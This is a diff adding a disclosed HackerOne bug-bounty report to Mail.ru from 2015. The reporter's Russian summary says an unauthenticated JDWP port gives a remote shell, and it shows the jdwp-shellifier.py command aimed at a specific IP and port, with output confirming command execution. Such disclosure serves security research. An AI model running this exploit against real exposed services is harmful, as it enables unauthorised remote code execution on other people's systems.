@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/49408
+WeaknessName:Command Injection - Generic
+Reporter:https://hackerone.com/isox
+ReportedTo:Mail.ru(mailru)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:13.09.2015 12:14:53
+
+Summary:
+
+Привет!
+На айпи 195.211.20.198 открыт JDWP без auth-а.
+Результат - удаленный шелл :)
+
+MacBook-Pro-Kirill:Pentest isox$ python2.7 jdwp-shellifier.py -t 195.211.20.198 -p 7605 --break-on 'java.lang.String.indexOf'
+[+] Targeting '195.211.20.198:7605'
+[+] Reading settings for 'Java HotSpot(TM) 64-Bit Server VM - 1.7.0_51'
+[+] Found Runtime class: id=666
+[+] Found Runtime.getRuntime(): id=7f670404cfa8
+[+] Created break event id=2
+[+] Waiting for an event on 'java.lang.String.indexOf'
+[+] Received matching event from thread 0xcef
+[+] Found Operating System 'Linux'
+[+] Found User name 'orion'
+[+] Found ClassPath '/home/orion/bin/orion.jar'
+[+] Found User home directory '/home/orion'
+[!] Command successfully executed
